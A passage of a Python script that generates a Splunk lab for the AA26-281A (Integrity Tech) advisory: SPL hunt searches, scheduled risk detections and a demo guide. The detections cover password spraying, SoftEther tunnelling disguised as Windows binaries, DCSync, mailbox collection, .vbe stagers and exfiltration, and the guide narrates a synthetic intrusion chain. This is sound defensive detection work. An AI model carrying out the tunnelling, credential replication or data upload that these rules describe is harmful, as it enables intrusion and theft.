    [search `aa26_iis` sc_status=200 cs_username=* cs_username!="-"
     | stats dc(cs_username) as signed_in_as by c_ip | rename c_ip as src]
| fillnull value=0 signed_in_as
| eval verdict=case(isnotnull(approved),"approved scanner",
    signed_in_as>0,"scanned, then signed in",
    true(),"background scanning")
| eval first_scan=strftime(first_scan,"%d %b %H:%M")
| table src direction hosts ports scan_days first_scan signed_in_as verdict"""},
    {"name": "AA26 30 - Exposure - Exploit attempts by source", "slide": "Exposure", "title": "Who tried the advisory's exploits against us, and did anything answer?", "spl": EXPLOIT_BASE + """
| lookup aa26_approved_scanners src AS c_ip OUTPUT reason AS approved
| eval direction=if(cidrmatch("10.0.0.0/8",c_ip),"internal","external")
| stats count as requests dc(attempt) as techniques values(attempt) as attempts count(eval(sc_status<400)) as answered
    min(_time) as first values(approved) as approved values(direction) as direction by c_ip
| eval verdict=case(isnotnull(approved),"approved scanner", techniques>=3,"multi-exploit sweep: investigate", true(),"opportunistic probe")
| eval first=strftime(first,"%d %b %H:%M")
| rename c_ip as src
| sort - techniques
| table src direction techniques attempts requests answered first verdict"""},
    {"name": "AA26 31 - Exposure - Advisory CVEs in our estate", "slide": "Exposure", "title": "The advisory's eight CVEs: present, internet-facing, scanned, attempted, visible?", "spl": """| inputlookup aa26_advisory_cves.csv
| eval age=tonumber(strftime(now(),"%Y"))-year
| join type=left cve
    [| inputlookup aa26_lab_vulns.csv | rename host as asset]
| join type=left public_ip
    [| tstats count from datamodel=Network_Traffic
        where All_Traffic.dest_port IN (21,22,53,80,443,1080)
        by All_Traffic.src All_Traffic.dest
     | eventstats dc(All_Traffic.dest) as reach by All_Traffic.src
     | where reach>=25
     | lookup aa26_approved_scanners src AS All_Traffic.src OUTPUT reason
     | where isnull(reason)
     | stats values(All_Traffic.src) as scanned_by by All_Traffic.dest
     | rename All_Traffic.dest as public_ip]
| join type=left cve
    [search """ + EXPLOIT_BASE.replace("\n", "\n    ") + """
     | lookup aa26_approved_scanners src AS c_ip OUTPUT reason
     | where isnull(reason)
     | eval cve=mvindex(split(attempt," "),0)
     | stats values(c_ip) as attempted_by by cve]
| join type=left asset
    [| tstats count as events where index IN (exchange,web,o365,wineventlog,sysmon,firewall,dns) by host
     | eval asset=upper(host) | fields asset events]
| eval telemetry=case(isnull(asset),"-", events>0,"logs to Splunk", true(),"NO LOGS"),
    priority=case(isnull(asset),"Not found: confirm inventory",
        internet_facing=="yes" AND isnotnull(scanned_by),"1 Patch now",
        internet_facing=="yes","2 Patch this week",
        true(),"3 Patch this month")
| sort cve
| table cve year age product impact kev_added_with_advisory asset internet_facing scanned_by attempted_by telemetry priority"""},
]

STORY = "AA26-281A Integrity Tech"
SHORT_HOST = '| eval dest=upper(mvindex(split(dest,"."),0))'
SHORT_USER = '| eval user=mvindex(split(user,"\\\\"),-1)'

# Scheduled base detections. Each writes risk (an intermediate finding) except the last, which raises the finding.
# Windows: every 30 or 60 minutes over the last complete window, except where a baseline needs more history.
DETECTIONS = [
    {"name": "Exchange password spray", "mitre": ["T1110.003"], "cron": "*/30 * * * *",
     "desc": "One source fails against ten or more mailboxes, a few attempts each, across Exchange interfaces (EBurst-style spraying).",
     "search": """`aa26_iis` cs_uri_stem IN ("/EWS/*","/owa/*","/ecp/*","/oab/*","/mapi/*","/rpc/*","/autodiscover/*","/powershell*","/Microsoft-Server-ActiveSync*","/api/*")
| eval interface=lower(mvindex(split(cs_uri_stem,"/"),1))
| bin _time span=30m
| stats count(eval(sc_status=401)) as failures dc(eval(if(sc_status=401,cs_username,null()))) as users dc(interface) as interfaces values(eval(if(sc_status=200,cs_username,null()))) as ok by _time c_ip
| where users>=10 AND failures/users<=3
| rename c_ip as src""",
     "risk": [("src", "system", 20)], "threat": [("src", "ip_address")],
     "message": "$src$ failed against $users$ mailboxes across $interfaces$ Exchange interfaces in 30 minutes"},
    {"name": "Spray source authenticated", "mitre": ["T1078", "T1110.003"], "cron": "*/30 * * * *",
     "desc": "An account that a spraying source failed against then succeeds from that same source in the same 30 minutes: the sprayed password worked.",
     "search": """`aa26_iis` cs_uri_stem IN ("/EWS/*","/owa/*","/ecp/*","/oab/*","/mapi/*","/rpc/*","/autodiscover/*","/powershell*","/Microsoft-Server-ActiveSync*","/api/*")
| bin _time span=30m
| stats count(eval(sc_status=401)) as fails count(eval(sc_status=200)) as wins by _time c_ip cs_username
| eventstats sum(fails) as failures dc(eval(if(fails>0,cs_username,null()))) as users by _time c_ip
| where users>=10 AND failures/users<=3 AND fails>0 AND wins>0
| rename c_ip as src cs_username as user""",
     "risk": [("user", "user", 40), ("src", "system", 40)], "threat": [("src", "ip_address")],
     "message": "$user$ was sprayed by $src$ and then authenticated from it ($users$ mailboxes sprayed in the same 30 minutes)"},
    {"name": "Scanning on advisory ports", "mitre": ["T1595.002"], "cron": "5 * * * *",
     "desc": "One source touches 25 or more hosts in an hour on the ports AA26-281A lists (21, 22, 53, 80, 443, 1080). Approved scanners are excluded.",
     "search": """| tstats dc(All_Traffic.dest) as hosts dc(All_Traffic.dest_port) as ports from datamodel=Network_Traffic where All_Traffic.dest_port IN (21,22,53,80,443,1080) by All_Traffic.src _time span=1h
| rename All_Traffic.src as src
| where hosts>=25
| lookup aa26_approved_scanners src OUTPUT reason
| where isnull(reason)""",
     "risk": [("src", "system", 10)], "threat": [("src", "ip_address")],
     "message": "$src$ scanned $hosts$ hosts on $ports$ of the AA26-281A ports in one hour", "earliest": "-2h@h", "latest": "-1h@h"},
    {"name": "Web enumeration burst", "mitre": ["T1595.003"], "cron": "*/30 * * * *",
     "desc": "Two hundred or more distinct missing .php/.asp paths from one client in ten minutes (dirsearch-style enumeration).",
     "search": """| tstats dc(Web.uri_path) as paths from datamodel=Web where Web.status=404 (Web.uri_path="*.php" OR Web.uri_path="*.asp*") by Web.src Web.http_user_agent _time span=10m
| rename Web.src as src Web.http_user_agent as http_user_agent
| where paths>=200""",
     "risk": [("src", "system", 10)], "threat": [("src", "ip_address")],
     "message": "$src$ requested $paths$ missing script paths in ten minutes"},
    {"name": "Exploit attempts for advisory CVEs", "mitre": ["T1190", "T1059.007"], "cron": "*/30 * * * *",
     "desc": "One source tries three or more of AA26-281A's exploited CVEs or XSS payloads against a web server (MicroScan-style exploit sweep). Approved scanners are excluded; 'answered' counts responses below 400.",
     "search": EXPLOIT_BASE + """
| lookup aa26_approved_scanners src AS c_ip OUTPUT reason AS approved
| where isnull(approved)
| stats count as requests dc(attempt) as techniques values(attempt) as attempts count(eval(sc_status<400)) as answered min(_time) as first_seen values(host) as dest by c_ip
| where techniques>=3
| rename c_ip as src""",
     "risk": [("src", "system", 20)], "threat": [("src", "ip_address")],
     "message": "$src$ tried $techniques$ exploits from the AA26-281A list against $dest$ ($requests$ requests, $answered$ answered)"},
    {"name": "SoftEther masquerading as Windows binary", "mitre": ["T1036.005", "T1133", "T1572"],
     "cron": "15 * * * *",
     "desc": "conhost.exe or dllhost.exe running outside System32/SysWOW64, or any process whose original file name is a SoftEther VPN client or bridge, unless the host and path are in the approved remote-access register. Risk goes to the host and its assigned owner.",
     "search": """| tstats count min(_time) as first_seen values(Processes.parent_process_name) as parent_process_name from datamodel=Endpoint.Processes where (Processes.process_name IN ("conhost.exe","dllhost.exe") NOT Processes.process_path IN ("C:\\\\Windows\\\\System32\\\\*","C:\\\\Windows\\\\SysWOW64\\\\*")) OR Processes.original_file_name IN ("vpnclient*","vpnbridge*") by Processes.dest Processes.process_name Processes.original_file_name Processes.process_path
| rename Processes.* as *
""" + SHORT_HOST + """
| lookup aa26_approved_remote_access dest process_path OUTPUT approved_by
| where isnull(approved_by)
| lookup aa26_lab_assets host AS dest OUTPUT owner""",
     "risk": [("dest", "system", 60), ("owner", "user", 60)], "threat": [("process_name", "process_name")],
     "message": "$process_name$ on $dest$ is really $original_file_name$ (SoftEther VPN), running from $process_path$"},
    {"name": "SoftEther dynamic DNS", "mitre": ["T1572", "T1568"], "cron": "15 * * * *",
     "desc": "A host resolves SoftEther dynamic DNS or VPN Azure names, which SoftEther uses to reach its server through firewalls.",
     "search": """| tstats count from datamodel=Network_Resolution where DNS.query IN ("*.softether.net","*.vpnazure.net") by DNS.src DNS.query
| rename DNS.src as src DNS.query as query
| lookup aa26_lab_assets ip AS src OUTPUT host AS dest owner
| eval dest=coalesce(dest,src)""",
     "risk": [("dest", "system", 20), ("owner", "user", 20)], "threat": [("query", "domain")],
     "message": "$src$ resolved $query$ $count$ times"},
    {"name": "Autostart service outside system paths", "mitre": ["T1543.003"], "cron": "20 * * * *",
     "desc": "A new auto-start service whose binary is outside Windows\\System32 and Program Files.",
     "search": """`wineventlog_system` EventCode=7045 NOT ImagePath IN ("*\\\\Windows\\\\System32\\\\*","*\\\\Program Files*")
| stats count min(_time) as first_seen by Computer ServiceName ImagePath StartType
| eval dest=Computer
""" + SHORT_HOST,
     "risk": [("dest", "system", 30)], "threat": [("ImagePath", "file_path")],
     "message": "New service '$ServiceName$' on $dest$ runs $ImagePath$"},
    {"name": "EWS volume far above normal", "mitre": ["T1114.002"], "cron": "10 * * * *",
     "desc": "A user's EWS calls in one hour are at least 500 and ten times their own 14-day hourly median, for users with at least 24 active hours of history (scripted mailbox collection).",
     "search": """`aa26_iis` sc_status=200 cs_uri_stem="/EWS/Exchange.asmx"
| bin _time span=1h
| stats count as calls values(cs_User_Agent) as agents by _time cs_username c_ip
| eventstats median(calls) as typical count as active_hours by cs_username
| where active_hours>=24 AND calls>=500 AND calls>=10*typical
| eval hour=strftime(_time,"%Y-%m-%d %H:00")
| rename cs_username as user c_ip as src""",
     "risk": [("user", "user", 50)], "threat": [("src", "ip_address")],
     "message": "$calls$ EWS calls as $user$ from $src$ in the hour starting $hour$ (typical: $typical$)",
     "earliest": "-14d@h", "latest": "@h", "suppress": ("user,hour", "15d")},
    {"name": "Unapproved app reading many mailboxes", "mitre": ["T1114.002", "T1550.001"],
     "cron": "25 * * * *",
     "desc": "An application not on the approved list reads five or more mailboxes (office-cli style collection through an app registration).",
     "search": """`aa26_o365` Operation=MailItemsAccessed
| stats dc(MailboxOwnerUPN) as mailboxes count values(ClientIPAddress) as src by AppId
| lookup approved_mail_apps AppId OUTPUT owner
| where mailboxes>=5 AND isnull(owner)""",
     "risk": [("AppId", "other", 40)], "threat": [("src", "ip_address")],
     "message": "Unapproved app $AppId$ read $mailboxes$ mailboxes", "earliest": "-24h@h", "latest": "@h", "suppress": ("AppId", "24h")},
    {"name": "New app secret or consent", "mitre": ["T1098.001"], "cron": "*/30 * * * *",
     "desc": "A credential is added to an application or service principal, or a user consents to an application.",
     "search": """`aa26_o365` Operation IN ("Add service principal credentials*","*Certificates and secrets*","Consent to application*")
| stats count values(ObjectId) as app values(ClientIP) as src by UserId Operation
| rename UserId as user""",
     "risk": [("user", "user", 30)], "threat": [("app", "other")],
     "message": "$user$: $Operation$ on $app$"},
    {"name": "DCSync by non-machine account", "mitre": ["T1003.006"], "cron": "*/30 * * * *",
     "desc": "Directory replication rights used by an account that is not a domain controller (needs 4662 auditing with the replication SACL).",
     "search": """`wineventlog_security` EventCode=4662 AccessMask=0x100 Properties IN ("*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*","*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*","*89e95b76-444d-4c62-991a-0facbeda640c*") NOT SubjectUserName="*$"
| stats count min(_time) as first_seen by SubjectUserName Computer
| rename SubjectUserName as user""",
     "risk": [("user", "user", 80)], "threat": [("Computer", "system")],
     "message": "$user$ requested directory replication from $Computer$"},
    {"name": "Advisory decoy file names", "mitre": ["T1036.008", "T1074.001"], "cron": "20 * * * *",
     "desc": "Files named like AA26-281A's staging and tool files (001.gif, Css.js, M2k*.js, Include.png, All_scanner_v*.pl.gz, .sess.zip).",
     "search": """| tstats count from datamodel=Endpoint.Filesystem where Filesystem.file_name IN ("001.gif","Css.js","M2k*.js","Include.png","All_scanner_v*.pl.gz",".sess.zip") by Filesystem.dest Filesystem.file_path Filesystem.file_name
| rename Filesystem.* as *
""" + SHORT_HOST,
     "risk": [("dest", "system", 30)], "threat": [("file_name", "file_name")],
     "message": "$file_name$ written to $file_path$ on $dest$"},
    {"name": "FishHub-style script stager", "mitre": ["T1566.001", "T1059.005", "T1105"],
     "cron": "15 * * * *",
     "desc": "A script host or PowerShell handles a .vbe file in a temp folder, the pattern of the FishHub downloader in the 8 Oct 2026 seizure affidavit.",
     "search": """| tstats count min(_time) as first_seen values(Processes.process) as process from datamodel=Endpoint.Processes where Processes.process_name IN ("wscript.exe","cscript.exe","powershell.exe") Processes.process="*temp*.vbe*" by Processes.dest Processes.user Processes.parent_process_name Processes.process_name
| rename Processes.* as *
""" + SHORT_HOST + "\n" + SHORT_USER,
     "risk": [("dest", "system", 40), ("user", "user", 40)], "threat": [("process_name", "process_name")],
     "message": "$parent_process_name$ started $process_name$ with a .vbe in %temp% on $dest$ as $user$"},
    {"name": "Known-bad domain resolved", "mitre": ["T1071.001", "T1105"], "cron": "15 * * * *",
     "desc": "A host resolves a domain from AA26-281A or the 8 Oct 2026 DOJ seizure (aa26_281a_domains lookup, wildcards allowed). Invalid and expired indicators are skipped; confidence and last-seen date go into the risk message.",
     "search": """| tstats count from datamodel=Network_Resolution by DNS.src DNS.query
| rename DNS.src as src DNS.query as query
| lookup aa26_281a_domains domain AS query OUTPUT ioc_source confidence last_seen expires
| where isnotnull(ioc_source) AND confidence!="invalid" AND strptime(expires,"%Y-%m-%d")>now()""",
     "risk": [("src", "system", 30)], "threat": [("query", "domain")],
     "message": "$src$ resolved $query$, a known Integrity Tech domain ($confidence$ confidence, $ioc_source$, last seen $last_seen$)"},
    {"name": "Connection to known-bad IP", "mitre": ["T1071.001", "T1041"], "cron": "15 * * * *",
     "desc": "Traffic to an IP address from AA26-281A or the 8 Oct 2026 DOJ seizure (aa26_281a_ips lookup). Invalid and expired indicators are skipped; confidence and last-seen date go into the risk message.",
     "search": """| tstats count sum(All_Traffic.bytes_out) as bytes_out from datamodel=Network_Traffic by All_Traffic.src All_Traffic.dest
| rename All_Traffic.* as *
| lookup aa26_281a_ips ip AS dest OUTPUT ioc_source confidence last_seen expires
| where isnotnull(ioc_source) AND confidence!="invalid" AND strptime(expires,"%Y-%m-%d")>now()
| eval MB_out=round(bytes_out/1e6,1)""",
     "risk": [("src", "system", 30)], "threat": [("dest", "ip_address")],
     "message": "$src$ connected to known Integrity Tech address $dest$ ($MB_out$ MB out; $confidence$ confidence, last seen $last_seen$)"},
    {"name": "Upload-heavy host", "mitre": ["T1048", "T1041"], "cron": "5 * * * *",
     "desc": "A host sends over 100 MB in an hour and at least five times what it receives.",
     "search": """| tstats sum(All_Traffic.bytes_out) as bytes_out sum(All_Traffic.bytes_in) as bytes_in from datamodel=Network_Traffic by All_Traffic.src _time span=1h
| rename All_Traffic.src as src
| where bytes_out > 5*bytes_in AND bytes_out > 100000000
| eval MB_out=round(bytes_out/1e6)""",
     "risk": [("src", "system", 20)], "threat": [],
     "message": "$src$ sent $MB_out$ MB in one hour", "earliest": "-2h@h", "latest": "-1h@h"},
]
THRESHOLD = {
    "name": "Integrity Tech behaviour chain",
    "desc": "Risk from the AA26-281A detections adds up to 100 or more across three or more ATT&CK tactics for one user or system.",
    "search": """| tstats sum(All_Risk.calculated_risk_score) as risk_score dc(All_Risk.annotations.mitre_attack.mitre_tactic_id) as tactics dc(source) as detections values(source) as sources from datamodel=Risk.All_Risk where source="AA26-281A - *" by All_Risk.risk_object All_Risk.risk_object_type
| rename All_Risk.* as *
| where risk_score>=100 AND tactics>=3""",
}


def write_saved_searches(lab, path):
    e, l = int(lab.start.timestamp()), int(lab.end.timestamp())
    pe, pl = int(lab.at(0, 15, 0).timestamp()), int(lab.at(1, 2, 20).timestamp())
    out = ["# Generated by generate_lab_data.py: every demo search, pinned to the scenario window.", ""]
    for s in SEARCHES:
        body = " \\\n".join(s["spl"].split("\n"))
        early, late = (pe, pl) if s["name"].startswith("AA26 19") else (e, l)
        out += [f"[{s['name']}]", f"description = {s['slide']}: {s['title']}", f"search = {body}",
                f"dispatch.earliest_time = {early}", f"dispatch.latest_time = {late}",
                "request.ui_dispatch_app = search", "request.ui_dispatch_view = search", "display.general.type = statistics",
                "display.page.search.tab = statistics", "is_scheduled = 0", "disabled = 0", ""]
    path.write_text("\n".join(out))


def detection_stanzas():
    """The detections ship in the Integrity Tech Detections app (build_detection_app.py), not in the lab app."""
    out = ["# Base detections for Enterprise Security 8.x. Scheduled and enabled; each writes risk (intermediate findings),",
           "# and 'Integrity Tech behaviour chain' raises a finding when one entity's risk crosses the threshold.", ""]
    conf = lambda s: " \\\n".join(s.split("\n"))
    for d in DETECTIONS:
        name = f"AA26-281A - {d['name']} - Rule"
        risk = [{"risk_object_field": f, "risk_object_type": t, "risk_score": s} for f, t, s in d["risk"]]
        risk += [{"threat_object_field": f, "threat_object_type": t} for f, t in d["threat"]]
        ann = {"analytic_story": [STORY, "Flax Typhoon"], "mitre_attack": d["mitre"], "type": "TTP",
               "data_source": [], "kill_chain_phases": []}
        meta = {"deprecated": "0", "detection_id": str(uuid.uuid5(uuid.NAMESPACE_URL, name)), "detection_version": "1"}
        out += [f"[{name}]", f"description = {d['desc']}", f"search = {conf(d['search'])}",
                "action.correlationsearch.enabled = 1", f"action.correlationsearch.label = {name}",
                "action.correlationsearch.detection_type = ebd",
                f"action.correlationsearch.annotations = {json.dumps(ann)}",
                f"action.correlationsearch.metadata = {json.dumps(meta)}",
                "action.risk = 1", f"action.risk.param._risk = {json.dumps(risk)}",
                f"action.risk.param._risk_message = {d['message']}", "action.risk.param._risk_score = 0",
                "action.risk.param.verbose = 0",
                f"cron_schedule = {d['cron']}", f"dispatch.earliest_time = {d.get('earliest', '-70m@m')}",
                f"dispatch.latest_time = {d.get('latest', '-10m@m')}", "enableSched = 1", "schedule_window = auto",
                "counttype = number of events", "relation = greater than", "quantity = 0", "alert.track = 0",
                "alert.digest_mode = 0"]
        if "suppress" in d:
            out += ["alert.suppress = 1", f"alert.suppress.fields = {d['suppress'][0]}", f"alert.suppress.period = {d['suppress'][1]}"]
        out += ["request.ui_dispatch_app = SplunkEnterpriseSecuritySuite", "disabled = 0", ""]
    name = f"AA26-281A - {THRESHOLD['name']} - Rule"
    ann = {"analytic_story": [STORY, "Flax Typhoon"], "type": "Correlation"}
    meta = {"deprecated": "0", "detection_id": str(uuid.uuid5(uuid.NAMESPACE_URL, name)), "detection_version": "1"}
    drill = [{"name": "Risk events for $risk_object$", "search": "| from datamodel Risk.All_Risk | search risk_object=\"$risk_object$\" source=\"AA26-281A - *\"",
              "earliest_offset": "$info_min_time$", "latest_offset": "$info_max_time$"}]
    out += [f"[{name}]", f"description = {THRESHOLD['desc']}", f"search = {conf(THRESHOLD['search'])}",
            "action.correlationsearch.enabled = 1", f"action.correlationsearch.label = {name}",
            "action.correlationsearch.detection_type = ebd",
            f"action.correlationsearch.annotations = {json.dumps(ann)}", f"action.correlationsearch.metadata = {json.dumps(meta)}",
            "action.notable = 1", "action.notable.param.rule_title = Integrity Tech behaviour chain on $risk_object$",
            f"action.notable.param.rule_description = $risk_object$ has risk $risk_score$ from $detections$ AA26-281A detections across $tactics$ ATT&CK tactics.",
            "action.notable.param.security_domain = threat", "action.notable.param.severity = high",
            "action.notable.param.nes_fields = risk_object", f"action.notable.param.drilldown_searches = {json.dumps(drill)}",
            "cron_schedule = 30 * * * *", "dispatch.earliest_time = -7d@h", "dispatch.latest_time = now", "enableSched = 1",
            "schedule_window = auto", "counttype = number of events", "relation = greater than", "quantity = 0",
            "alert.track = 0", "alert.digest_mode = 0", "alert.suppress = 1", "alert.suppress.fields = risk_object",
            "alert.suppress.period = 24h", "request.ui_dispatch_app = SplunkEnterpriseSecuritySuite", "disabled = 0", ""]
    return out


def detection_names():
    return [f"AA26-281A - {d['name']} - Rule" for d in DETECTIONS] + [f"AA26-281A - {THRESHOLD['name']} - Rule"]


def write_inputs(manifest, path):
    out = ["# Generated by generate_lab_data.py. Each file is read once; reinstalling the app does not re-index it.", ""]
    for m in manifest:
        out += [f"[monitor://$SPLUNK_HOME/etc/apps/{APP.name}/{m['file']}]", f"index = {m['index']}",
                f"sourcetype = {m['sourcetype']}", f"source = {m['source']}", f"host = {m['host']}", "disabled = false"]
        if m["file"].endswith(("_v2.xml", "_v3.log")):
            # These can start with the same 256 bytes as the v1 file of the same type, so Splunk's file CRC would skip them.
            out.append("crcSalt = <SOURCE>")
        out.append("")
    path.write_text("\n".join(out))


def write_demo_doc(lab, exp, manifest, path):
    w = []
    a = w.append

    def table(cols, rows):
        if not rows:
            a("_No results. That is the expected outcome._\n")
            return
        a("| " + " | ".join(cols) + " |\n|" + "---|" * len(cols))
        for r in rows:
            a("| " + " | ".join(", ".join(map(str, r[c])) if isinstance(r[c], list) else str(r[c]).replace("|", "\\|")
                                for c in cols) + " |")
        a("")

    seeds = [ln for ln in (path.parent / "output" / "seed_risk.spl").read_text().splitlines() if ln.strip()]
    per_index = defaultdict(int)
    for m in manifest:
        per_index[(m["index"], m["sourcetype"])] += m["events"]
    a("# AA26-281A demo: synthetic data and SPL searches\n")
    a(f"Scenario window: **{lab.start:%a %d %b %Y %H:%M}** to **{lab.end:%a %d %b %Y %H:%M}**, {lab.tz.key} "
      f"(epoch {int(lab.start.timestamp())} to {int(lab.end.timestamp())}). Day 0 is {lab.day0:%a %d %b %Y}.\n")
    a("## 1. Load it\n")
    a(f"1. In Splunk Web: **Apps > Manage Apps > Install app from file**, choose `dist/{APP.name}.tgz`, then restart when prompted. "
      "The app creates the indexes, parses the data, maps it to CIM, adds the lookups and saved reports, and indexes the bundled "
      f"data automatically (about {sum(per_index.values()):,} events, usually under five minutes). Install "
      "`dist/integrity_tech_detections.tgz` the same way: it holds the detections and dashboards.")
    a("2. Set your user time zone to " + lab.tz.key + " (**Preferences > Time zone**) so times match the slides.")
    a(f"3. Run the {len(seeds)} risk-seeding searches in section 2 **once**.")
    a(f"4. Open the saved reports **AA26 01** to **AA26 {len(SEARCHES):02d}** in the Search app. They are pinned to the scenario window, so you don't "
      "need to touch the time picker. If you paste the SPL below instead, set the time picker to the scenario window first.\n")
    a("Requires Splunk Enterprise with Enterprise Security 8.x, Splunk_SA_CIM, and the Splunk add-ons for Microsoft Windows, Sysmon and "
      "Microsoft Office 365 (the app maps Sysmon itself if that add-on is missing). Lab only: `labctl.py load` adds the lab "
      "indexes to the admin role's default search indexes, because data model searches read only those.\n")
    a("Check it landed (time picker: All time):\n")
    a("```\n| tstats count where index IN (exchange, web, o365, wineventlog, sysmon, firewall, dns) by index sourcetype\n```\n")
    table(["index", "sourcetype", "events"], [{"index": i, "sourcetype": s, "events": f"{n:,}"} for (i, s), n in per_index.items()])
    a("## 2. Seed the risk events (once)\n")
    a(f"Scheduled detections only look at recent time, so these {len(seeds)} searches write the intermediate findings the lab's detections "
      "(section 4) would have raised over the scenario. Each search is one detection and uses that detection's name as its source. They need the `risk` index, which Enterprise Security provides. Running them twice "
      "doubles the scores; check first with `index=risk aa26_lab=1 | stats count`.\n")
    for k, line in enumerate(seeds, 1):
        a(f"**{k}. {line.split('source=\"')[1].split('\"')[0]}**\n\n```\n{line}\n```\n")
    a("## 3. The searches, in demo order\n")
    expect = {
        "AA26 01": (None, None, "Your instance's other indexes appear too. The lab rows match the table in section 1. Point out that "
                    "there is no 4662 data and no Linux source."),
        "AA26 02": (None, None, "All five fields populated across hundreds of thousands of events."),
        "AA26 03": (["_time", "c_ip", "failures", "users", "interfaces", "ok", "verdict"], exp["spray"],
                    "Remember the name j.citizen. 'ok' lists only accounts the source failed against and then got into, in the same window."),
        "AA26 04": (["_time", "src", "hosts", "ports"], exp["recon_network"],
                    f"{VULN_SCANNER} is the internal vulnerability scanner: allow-list it. {NET_SCANNER} is internet background noise. "
                    f"{ATTACKER_SCAN} is the actor: 41 hosts, all six advisory ports."),
        "AA26 05": (["_time", "src", "http_user_agent", "paths"], exp["recon_web"], "Same source as the scan, ten minutes later."),
        "AA26 06": (["dest", "process_name", "original_file_name", "count", "first_seen", "path", "parent"], exp["softether_process"],
                    f"The attacker's copy on {VICTIM_WS} started twice: at install (Day 1) and after a reboot (Day 2). "
                    f"{lab.users[LEGIT_VPN_INDEX]['ws']} is the IT team's approved SoftEther VPN Client in Program Files: the false positive "
                    "that AA26 23 tunes out."),
        "AA26 07": (["src", "query", "count"], exp["softether_dns"], f"{VICTIM_IP} is {VICTIM_WS}."),
        "AA26 08": (["dest", "count"], exp["escu_softether"],
                    "This is the search behind ESCU's 'Windows SoftEther VPN Masquerading as Legitimate Binary'. It is scheduled over the "
                    "last hour, so run it ad hoc over historical data."),
        "AA26 09": (["_time", "cs_username", "c_ip", "calls", "typical", "agents"], exp["ews_volume"],
                    "svc-crm makes about 160 EWS calls every hour and never alerts: the per-user baseline is doing its job. Users with "
                    "fewer than 24 active hours are skipped, because a median of two or three hours is not a baseline."),
        "AA26 10": (["AppId", "mailboxes", "count"], exp["m365_app_access"],
                    f"'{ROGUE_APP_NAME}', owned by {VICTIM}, reading from {ATTACKER_COLLECT}. The backup app reads every audited mailbox "
                    "nightly but is approved. Only 30 of 120 mailboxes are audited: the 'partial' in Act 2."),
        "AA26 11": (["_time", "UserId", "Operation", "ObjectId"], exp["m365_secrets"], "The secret was added the night before the app read the mail."),
        "AA26 12": ([], [], "Zero events, because the replication audit SACL was never set. The gap from Act 2, now proven."),
        "AA26 13": (["dest", "file_path", "file_name"], exp["staging"],
                    "WEB01's Css.js is a legitimate deployment: filter by path and host role."),
        "AA26 14": (["risk_object", "risk", "tactics", "detections"], exp["risk"],
                    "Two findings: j.citizen (the advisory's Exchange-to-SoftEther chain) and a.lim (the FishHub chain from the "
                    "seizure affidavit). Without the threshold: " + "; ".join(f"{r['risk_object']} {r['risk']} ({r['tactics']} tactics)" for r in exp["risk_all"]) + "."),
        "AA26 15": (["_time", "src", "users", "failures"], exp["auth_spray"],
                    f"The same spray in the 4625 events, but the source is MAIL01, not {ATTACKER_SCAN}: for Exchange logons the Windows "
                    "add-on maps CIM src to the workstation name, which is the Exchange server itself. The attacker's address is only in "
                    "IpAddress. That is why the IIS log is the better source for spray detection."),
        "AA26 16": (["_time", "Computer", "ServiceName", "ImagePath"], exp["new_services"],
                    "The Lenovo service is benign. 'Console Host Service' is SoftEther."),
        "AA26 17": (["_time", "src", "MB_out"], exp["upload_hours"],
                    f"{VICTIM_IP} ({VICTIM_WS}) through the SoftEther tunnel, and {FISH_IP} ({FISH_WS}) uploading the FishHub archive."),
        "AA26 18": (["src", "query", "ioc_source"], exp["ioc_sweep"],
                    f"One hit, and it is not from the advisory. The j.citizen intrusion used new infrastructure ({SOFTETHER_DDNS}, {STAGE_C2}), "
                    f"so the advisory's 227 domains never appear. {FISH_IP} ({FISH_WS}) resolved {FISHHUB_HOST}, one of the FishHub "
                    "domains the FBI seized on 8 Oct 2026; six of the seven seized domains are not in the advisory's indicator list. "
                    "Fresh indicators help; old ones rarely do; the behavioural searches found both intrusions anyway."),
        "AA26 19": (["_time", "EventCode", "Image", "ParentImage", "detail"], exp["pivot"],
                    "Saved report is pinned to Day 0 15:00 to Day 1 02:20. live700_v1.exe (the advisory's fake-login payload) drops "
                    "DiagTrack.exe, which later launches the PowerShell that fetches SoftEther."),
        "AA26 20": (["dest", "user", "parent_process_name", "process_name", "count"], exp["fishhub"],
                    f"Outlook starts PowerShell, which saves {FISHHUB_STEM}.vbe into %temp% (the exact pattern in the FBI's FishHub "
                    "affidavit); wscript.exe runs it. The follow-on commands list documents, zip them and upload 186 MB."),
        "AA26 21": (["src", "dest"], [{"src": s, "dest": d} for s, d in exp["ioc_ip"]],
                    f"{FISH_IP} uploading to {FISHHUB_EXFIL}, the FishHub collection server. This address is in the advisory's STIX file, "
                    "so here the advisory's indicators do match: the FishHub operators reused known infrastructure."),
        "AA26 22": (["host", "signals", "evidence"], exp["softether_corr"],
                    f"{VICTIM_WS} has all three signals: process metadata, an autostart service outside system paths, and SoftEther dynamic "
                    f"DNS. {lab.users[LEGIT_VPN_INDEX]['ws']} has one (its service is in Program Files and it uses no dynamic DNS). One "
                    "signal is a question; three is a finding."),
        "AA26 23": (["dest", "process_name", "original_file_name", "process_path"],
                    [dict(zip(["dest", "process_name", "original_file_name", "process_path"], r)) for r in exp["softether_tuned"]],
                    f"Only {VICTIM_WS}. The approved install on {lab.users[LEGIT_VPN_INDEX]['ws']} is removed by the approved remote-access "
                    "register (host plus path, with an owner and review date), not by weakening the logic."),
        "AA26 24": (None, None, f"The six risk events behind j.citizen's 200, in order: scan, spray, spray success, SoftEther, dynamic "
                    "DNS, EWS collection. Every point traces to a named detection and a message."),
        "AA26 25": (["c_ip", "seen_before", "count", "agents"], exp["signin"],
                    f"Two addresses she has never used: {ATTACKER_SCAN} (the spray source) and {ATTACKER_COLLECT} (2,400 EWS calls an "
                    "hour, no user agent)."),
        "AA26 26": (None, None, "Both are high-priority identities. This is the context that decides how fast the analyst escalates."),
        "AA26 27": (["host", "cve", "public_ip", "scanned_by", "state"], exp["vuln_state"],
                    "Five vulnerable assets, three different states. Patch order follows the state, not just the CVSS score."),
        "AA26 29": ([], [], "Three scanners, three verdicts. 10.20.0.50 is internal, on the approved register, every Sunday morning. "
                    "198.51.100.77 is external, two isolated hours, ports 22 and 443 only, and never signs in: background. "
                    "203.0.113.47 is external, appears once (28 Sep 09:00), hits all six advisory ports and then signs in as one user: the actor."),
        "AA26 30": (["src", "techniques", "attempts", "requests", "answered", "verdict"], exp["exploit_sources"],
                    f"{ATTACKER_SCAN} tries six of the advisory's CVEs and three XSS payloads against WEB01 at 09:41, between the scan "
                    f"and the spray. The website answered two of the XSS requests with 200: check that /search.aspx and /contact.aspx "
